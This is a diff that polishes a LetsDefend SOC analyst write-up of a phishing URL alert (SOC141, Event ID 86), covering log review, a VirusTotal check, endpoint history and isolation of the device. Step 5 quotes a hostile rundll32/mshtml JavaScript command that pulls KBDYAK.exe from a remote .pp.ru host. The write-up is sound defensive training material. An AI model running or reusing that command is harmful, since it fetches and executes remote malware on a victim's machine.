@@ -1,59 +1,66 @@
 # LetsDefend Write-Up: SOC141 – Phishing URL Detected
 
-| | |
-|---|---|
-| **Platform** | LetsDefend |
-| **Event ID** | 86 |
-| **Rule** | SOC141 - Phishing URL Detected |
-| **Level** | Security Analyst |
+|              |                                |
+| ------------ | ------------------------------ |
+| **Platform** | LetsDefend                     |
+| **Event ID** | 86                             |
+| **Rule**     | SOC141 - Phishing URL Detected |
+| **Level**    | Security Analyst               |
 
 ## 1. Alert Details
 
-| Field | Value |
-|---|---|
-| Event time | March 22 2021 21:23 PM |
-| Username | ellie |
-| Source Hostname | EmilyComp |
-| Source Address | 172.16.17.49 |
-| Destination Address | 91.189.114.8 |
-| Destination Hostname | mogagrocol.ru |
+| Field                | Value                    |
+| -------------------- | ------------------------ |
+| Event Time           | March 22, 2021, 21:23 PM |
+| Username             | ellie                    |
+| Source Hostname      | EmilyComp                |
+| Source Address       | 172.16.17.49             |
+| Destination Address  | 91.189.114.8             |
+| Destination Hostname | mogagrocol.ru            |
 
+## Step 1 - Read the Alert Details
 
-## Step 1 - Read the alert details
-I read the alert SOC141 (Event ID 86) and recorded the time, Username, Source address, Source Host name, Destination Address, Destination Host name and device action
+I reviewed the SOC141 alert (Event ID 86) and recorded the time, username, source address, source hostname, destination address, destination hostname, and device action.
 
+## Step 2 - Check the Log Management
 
-## Step 2 - Check the log management
-I used the Source IP in log management and saw there are connection with the Source Address to URL
+I used the source IP address in Log Management and found connections from the source address to the URL.
 
 ![Photo](Image/2/log_management.png)
 
 ## Step 3 - Analyze the URL
-In virustotal I search for URL it's return it as a malicious URL
-![threat_intel](Image/2/virustotal.png)
 
-## Step 4 - Check if the URL Delivered or anyone connected to it
-I used the Destination IP of the URL and search with it in log management to saw if anyone connected to this URL and it's return one Device and it's the same device that alert come from it
+I searched for the URL on VirusTotal, and it was identified as malicious.
 
-## Step 5 - Review the username history
-Searching the username `EmilyComp` in the Endpoint Security and saw the history of terminal, process, Browser:
+![threat\_intel](Image/2/virustotal.png)
+
+## Step 4 - Check Whether the URL Was Accessed
+
+I used the destination IP address of the URL to search in Log Management for any devices that had connected to it. The search returned one device, which was the same device that triggered the alert.
+
+## Step 5 - Review the Username History
+
+I searched for `EmilyComp` in Endpoint Security and reviewed the terminal, process, and browser histories.
+
 ![Photo](Image/2/endpoint.png)
 ![Photo](Image/2/endpoint2.png)
 
-In terminal history:
-```
+In the terminal history, I found the following command:
+
+```text
 rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')'
 ```
-This command is highly suspicious because it abuses the legitimate Windows executable rundll32.exe to invoke JavaScript through the mshtml component. It then uses GetObject() with a remote URL, indicating an attempt to retrieve or process content from an external host.
 
-The URL references a file named KBDYAK.exe, which may be a malicious payload. The command's structure is consistent with a technique used by attackers to leverage legitimate Windows components to initiate suspicious script activity and retrieve external content.
+This command is highly suspicious because it abuses the legitimate Windows executable `rundll32.exe` to invoke JavaScript through the `mshtml` component. It then uses `GetObject()` with a remote URL, indicating an attempt to retrieve or process content from an external host.
 
-The file `KBDYAK.exe` it run on the Device I know that from the process history so the file was executed in the device so I must isolate the device
+The URL references a file named `KBDYAK.exe`, which may be a malicious payload. The command's structure is consistent with a technique used by attackers to leverage legitimate Windows components to initiate suspicious script activity and retrieve external content.
 
-## Step 6 - Contain The Device
-I Containment the device from the network isolated it to more investigation on the device 
+I confirmed from the process history that the file `KBDYAK.exe` was executed on the device. Therefore, I needed to isolate the device for further investigation.
+
+## Step 6 - Contain the Device
+
+I contained the device by isolating it from the network to allow for further investigation.
 
 ![Photo](Image/2/contain.png)
 
-Closed the alert as a True Positive.
-
+I closed the alert as a **True Positive**.
